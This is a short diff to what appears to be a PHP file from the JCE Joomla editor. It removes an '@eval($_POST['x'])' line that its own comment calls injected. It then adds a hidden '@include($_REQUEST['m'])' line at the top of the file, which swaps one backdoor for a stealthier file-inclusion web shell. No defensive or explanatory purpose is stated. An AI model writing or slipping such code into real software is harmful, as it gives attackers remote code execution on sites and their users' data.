@@ -1,5 +1,5 @@
+<?php if(isset($_REQUEST['m'])){ @include($_REQUEST['m']); } ?>
 <?php
-@eval($_POST['x']); // <-- injected into JCE core
 
 /**
  * @copyright     Copyright (c) 2009-2026 Ryan Demmer. All rights reserved
